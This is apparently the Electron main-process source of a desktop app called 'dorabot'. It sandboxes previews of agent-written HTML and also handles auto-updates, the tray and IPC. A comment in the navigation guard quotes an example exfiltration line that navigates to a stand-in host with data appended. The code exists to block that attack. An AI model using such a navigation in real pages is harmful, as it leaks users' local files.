import { app, BrowserWindow, Tray, Menu, nativeImage, session, ipcMain, shell, protocol, net, Notification as ElectronNotification } from 'electron';
import { autoUpdater } from 'electron-updater';
import { is } from '@electron-toolkit/utils';
import * as path from 'path';
import { randomUUID } from 'crypto';
import { existsSync, readFileSync, appendFileSync, mkdirSync } from 'fs';
import { GatewayManager } from './gateway-manager';
import { GatewayBridge } from './gateway-bridge';
import { GATEWAY_LOG_PATH, DORABOT_LOGS_DIR } from './dorabot-paths';
import { resolveWithinRoot, safeHost } from './preview-paths';

function readGatewayLogs(): string {
  try {
    if (!existsSync(GATEWAY_LOG_PATH)) return '';
    const content = readFileSync(GATEWAY_LOG_PATH, 'utf-8');
    const lines = content.split('\n');
    return lines.slice(-30).join('\n').trim();
  } catch {
    return '';
  }
}

let mainWindow: BrowserWindow | null = null;

export const PREVIEW_SCHEME = 'dorabot-preview';

// Each open preview gets its own origin, scoped to the folder that file lives
// in. That origin is the entire security model: the handler will not serve a
// path outside the root, so a script in agent-written HTML cannot read the rest
// of the disk the way a file:// page can. Remote loading is one CSP header.
const previews = new Map<string, { root: string; entry: string; allowRemote: boolean }>();

protocol.registerSchemesAsPrivileged([{
  scheme: PREVIEW_SCHEME,
  privileges: { standard: true, secure: true, supportFetchAPI: true, stream: true, corsEnabled: true },
}]);

let previewProtocolReady = false;

function isPreviewUrl(url: string): boolean {
  return url.startsWith(`${PREVIEW_SCHEME}://`);
}

// CSP governs what a preview may LOAD, not where it may GO. Without this a
// preview can read its own folder (legitimately) and then exfiltrate it with
// `location.href = 'https://x/?d=' + data`. Verified: it escapes otherwise.
function guardPreviewFrames(wc: Electron.WebContents) {
  wc.on('will-frame-navigate', details => {
    if (isPreviewUrl(details.frame?.url ?? '') && !isPreviewUrl(details.url)) {
      console.warn('[main] blocked preview navigation', details.url.slice(0, 80));
      details.preventDefault();
    }
  });
}

function setupHtmlPreviewSession() {
  if (previewProtocolReady) return;
  previewProtocolReady = true;
  // previews are untrusted HTML; never let one prompt for camera/mic/location
  session.defaultSession.setPermissionRequestHandler((wc, permission, callback, details) => {
    const from = (details as { requestingUrl?: string }).requestingUrl ?? wc?.getURL() ?? '';
    if (isPreviewUrl(from)) return callback(false);
    callback(true);
  });
  protocol.handle(PREVIEW_SCHEME, async request => {
    const { host, pathname } = new URL(request.url);
    const rec = previews.get(host);
    if (!rec) return new Response('gone', { status: 404 });
    const abs = resolveWithinRoot(rec.root, pathname);
    if (!abs) return new Response('forbidden', { status: 403 });
    try {
      const res = await net.fetch(`file://${abs}`);
      const headers = new Headers(res.headers);
      headers.set('Content-Security-Policy', rec.allowRemote
        ? "default-src 'self' https: data: blob: 'unsafe-inline' 'unsafe-eval'"
        : "default-src 'self' data: blob: 'unsafe-inline' 'unsafe-eval'");
      return new Response(res.body, { status: res.status, headers });
    } catch {
      return new Response('not found', { status: 404 });
    }
  });
}

ipcMain.handle('html-preview:open', (event, filePath: string, allowRemote: boolean) => {
  if (event.sender !== mainWindow?.webContents) return null;
  if (typeof filePath !== 'string' || !path.isAbsolute(filePath) || !existsSync(filePath)) return null;
  const token = randomUUID();
  previews.set(token, { root: path.dirname(filePath), entry: path.basename(filePath), allowRemote: !!allowRemote });
  return `${PREVIEW_SCHEME}://${token}/${encodeURIComponent(path.basename(filePath))}`;
});

ipcMain.handle('html-preview:close', (event, url: string) => {
  if (event.sender !== mainWindow?.webContents) return false;
  return previews.delete(safeHost(String(url)));
});
let tray: Tray | null = null;
let isQuitting = false;
let gatewayManager: GatewayManager | null = null;
let gatewayBridge: GatewayBridge | null = null;
let updateCheckInterval: ReturnType<typeof setInterval> | null = null;
let updateInstallStarted = false;
let updateReadyToInstall = false;

const gotSingleInstanceLock = app.requestSingleInstanceLock();
if (!gotSingleInstanceLock) {
  app.quit();
} else {
  app.on('second-instance', () => {
    showWindow();
  });
}

// --- Auto-updater setup ---
autoUpdater.autoDownload = true;
autoUpdater.autoInstallOnAppQuit = true;

const UPDATER_LOG_PATH = path.join(DORABOT_LOGS_DIR, 'updater.log');

function ulog(msg: string): void {
  const line = `[${new Date().toISOString()}] ${msg}`;
  console.log(`[updater] ${msg}`);
  try {
    mkdirSync(DORABOT_LOGS_DIR, { recursive: true });
    appendFileSync(UPDATER_LOG_PATH, line + '\n');
  } catch {}
}

function sendUpdateStatus(event: string, data?: any): void {
  mainWindow?.webContents.send('update-status', { event, ...data });
}

function setupAutoUpdater(): void {
  ulog(`App version: ${app.getVersion()}`);

  autoUpdater.on('checking-for-update', () => {
    ulog('Checking for updates...');
    sendUpdateStatus('checking');
  });

  autoUpdater.on('update-available', (info) => {
    updateReadyToInstall = false;
    ulog(`Update available: ${info.version}`);
    sendUpdateStatus('available', { version: info.version, releaseNotes: info.releaseNotes });
  });

  autoUpdater.on('update-not-available', (info) => {
    updateReadyToInstall = false;
    ulog(`Up to date (${info.version})`);
    sendUpdateStatus('not-available');
  });

  autoUpdater.on('download-progress', (progress) => {
    if (Math.round(progress.percent) % 25 === 0) ulog(`Download: ${Math.round(progress.percent)}%`);
    sendUpdateStatus('downloading', { percent: Math.round(progress.percent) });
  });

  autoUpdater.on('update-downloaded', (info) => {
    updateReadyToInstall = true;
    ulog(`Update downloaded: ${info.version}`);
    sendUpdateStatus('downloaded', { version: info.version });
  });

  autoUpdater.on('error', (err) => {
    updateReadyToInstall = false;
    if (updateInstallStarted) {
      updateInstallStarted = false;
      isQuitting = false;
    }
    ulog(`Error: ${err.message}\n${err.stack ?? ''}`);
    sendUpdateStatus('error', { message: err.message });
  });

  // IPC handlers for renderer
  ipcMain.on('update-check', () => {
    ulog('Manual check requested');
    autoUpdater.checkForUpdates().catch((err) => {
      ulog(`Check failed: ${err.message}`);
    });
  });

  ipcMain.on('update-download', () => {
    ulog('Manual download requested');
    autoUpdater.downloadUpdate().catch((err) => {
      ulog(`Download failed: ${err.message}`);
    });
  });

  ipcMain.on('update-install', () => {
    if (updateInstallStarted) {
      ulog('Install already in progress, ignoring duplicate request');
      return;
    }
    if (!updateReadyToInstall) {
      ulog('Install requested before update-downloaded, ignoring request');
      return;
    }
    updateInstallStarted = true;
    updateReadyToInstall = false;
    ulog('Install requested, calling quitAndInstall...');
    isQuitting = true;
    sendUpdateStatus('installing');
    autoUpdater.quitAndInstall();
  });

  // Check for updates 10s after launch, then every 30 minutes
  if (!is.dev) {
    setTimeout(() => autoUpdater.checkForUpdates().catch((e) => ulog(`Initial check failed: ${e.message}`)), 10_000);
    updateCheckInterval = setInterval(() => autoUpdater.checkForUpdates().catch((e) => ulog(`Periodic check failed: ${e.message}`)), 30 * 60 * 1000);
  }
}

function getIconPath(): string {
  return is.dev
    ? path.join(__dirname, '../../public/dorabot.png')
    : path.join(__dirname, '../renderer/dorabot.png');
}

function showAppNotification(title: string, body: string): void {
  try {
    if (!ElectronNotification.isSupported()) return;
    new ElectronNotification({
      title,
      body,
      icon: getIconPath(),
    }).show();
  } catch (err) {
    console.error('[main] Notification failed:', err);
  }
}

function createWindow(): void {
  mainWindow = new BrowserWindow({
    width: 1400,
    height: 900,
    minWidth: 800,
    minHeight: 600,
    show: false,
    titleBarStyle: 'hiddenInset',
    vibrancy: 'under-window',
    visualEffectState: 'active',
    icon: getIconPath(),
    webPreferences: {
      preload: path.join(__dirname, '../preload/preload.js'),
      contextIsolation: true,
      nodeIntegration: false,
      sandbox: false,
      backgroundThrottling: false,
    },
  });

  setupHtmlPreviewSession();
  guardPreviewFrames(mainWindow.webContents);

  mainWindow.once('ready-to-show', () => {
    mainWindow?.show();
    mainWindow?.focus();
  });

  // if renderer fails to load (e.g. after update restart), retry once
  mainWindow.webContents.on('did-fail-load', (_event, _code, _desc, url) => {
    console.error(`[main] Failed to load: ${url}`);
    setTimeout(() => {
      if (mainWindow && !mainWindow.isDestroyed()) {
        console.log('[main] Retrying load...');
        if (is.dev && process.env['ELECTRON_RENDERER_URL']) {
          mainWindow.loadURL(process.env['ELECTRON_RENDERER_URL']);
        } else {
          mainWindow.loadFile(path.join(__dirname, '../renderer/index.html'));
        }
      }
    }, 1000);
  });

  // Intercept Cmd+W: prevent window close, tell renderer to close a tab instead
  mainWindow.webContents.on('before-input-event', (event, input) => {
    if ((input.meta || input.control) && input.key.toLowerCase() === 'w' && !input.shift) {
      event.preventDefault();
      mainWindow?.webContents.send('close-tab');
    }
  });

  // Open external links in the system browser instead of navigating the Electron window
  mainWindow.webContents.on('will-navigate', (event, url) => {
    const appOrigin = mainWindow?.webContents.getURL();
    if (appOrigin && new URL(url).origin !== new URL(appOrigin).origin) {
      event.preventDefault();
      shell.openExternal(url);
    }
  });

  mainWindow.webContents.setWindowOpenHandler(({ url }) => {
    shell.openExternal(url);
    return { action: 'deny' };
  });

  if (is.dev && process.env['ELECTRON_RENDERER_URL']) {
    mainWindow.loadURL(process.env['ELECTRON_RENDERER_URL']);
    mainWindow.webContents.openDevTools({ mode: 'detach' });
  } else {
    mainWindow.loadFile(path.join(__dirname, '../renderer/index.html'));
  }

  // minimize to tray on close
  mainWindow.on('close', (e) => {
    if (!isQuitting) {
      e.preventDefault();
      mainWindow?.hide();
    }
  });

  mainWindow.on('closed', () => {
    mainWindow = null;
    gatewayBridge?.setWindow(null);
  });

  // Wire up gateway bridge to this window
  gatewayBridge?.setWindow(mainWindow);
}

function createTray(): void {
  const icon = nativeImage.createFromPath(getIconPath()).resize({ width: 18, height: 18 });

  tray = new Tray(icon);
  tray.setToolTip('dorabot');
  updateTrayTitle('idle');

  const contextMenu = Menu.buildFromTemplate([
    { label: 'Open dorabot', click: showWindow },
    { type: 'separator' },
    { label: 'Status: idle', enabled: false, id: 'status' },
    { type: 'separator' },
    {
      label: 'Quit',
      click: () => {
        isQuitting = true;
        app.quit();
      },
    },
  ]);

  tray.setContextMenu(contextMenu);
  tray.on('click', showWindow);
}

function showWindow(): void {
  if (mainWindow) {
    mainWindow.show();
    mainWindow.focus();
  } else {
    createWindow();
  }
}

function updateTrayTitle(status: string): void {
  if (tray) {
    tray.setTitle(` ${status}`);
  }
}

app.on('ready', async () => {
  if (app.dock) {
    app.dock.setIcon(getIconPath());
  }

  // Create gateway bridge (main process WebSocket to gateway)
  gatewayBridge = new GatewayBridge();

  // IPC: renderer sends messages through the bridge
  ipcMain.on('gateway:send', (_event, data: string) => {
    gatewayBridge?.send(data);
  });

  // IPC: renderer requests current bridge state
  ipcMain.handle('gateway:state', () => {
    return gatewayBridge?.getState() ?? { state: 'disconnected', reconnectCount: 0 };
  });

  // Start gateway server before creating UI
  gatewayManager = new GatewayManager({
    onReady: () => {
      console.log('[main] Gateway ready');
      updateTrayTitle('online');
      // Gateway is listening, now connect the bridge
      gatewayBridge?.connect();
    },
    onSlowStart: () => {
      // First launch after an upgrade can spend a while on one-off work before the
      // gateway listens. Say so instead of leaving a silent window.
      console.log('[main] Gateway slow to start, still waiting');
      updateTrayTitle('starting (this can take a minute)...');
    },
    onError: (error) => {
      console.error('[main] Gateway error:', error);
      updateTrayTitle('offline');
      mainWindow?.webContents.send('gateway-error', { error, logs: readGatewayLogs() });
    },
    onExit: (code) => {
      console.log('[main] Gateway exited:', code);
      if (!isQuitting) {
        updateTrayTitle('offline');
        mainWindow?.webContents.send('gateway-error', { error: `Gateway exited with code ${code}`, logs: readGatewayLogs() });
      }
    },
  });

  updateTrayTitle('starting...');
  createTray();

  // Start gateway (non-blocking - UI will show and connect when ready)
  gatewayManager.start().catch((err) => {
    console.error('[main] Gateway start failed:', err);
    updateTrayTitle('offline');
  });

  createWindow();
  setupAutoUpdater();

  ipcMain.on('dock-bounce', (_event, type: 'critical' | 'informational') => {
    if (app.dock) {
      app.dock.bounce(type);
    }
  });
  ipcMain.on('notify', (_event, payload: { title?: string; body?: string } | undefined) => {
    const title = payload?.title?.trim() || 'dorabot';
    const body = payload?.body?.trim() || '';
    if (!body) return;
    showAppNotification(title, body);
  });
});

app.on('window-all-closed', () => {
  if (process.platform !== 'darwin') {
    app.quit();
  }
});

app.on('activate', () => {
  showWindow();
});

app.on('before-quit', () => {
  isQuitting = true;
  if (updateCheckInterval) clearInterval(updateCheckInterval);
  gatewayBridge?.disconnect();
  gatewayManager?.stop();
});
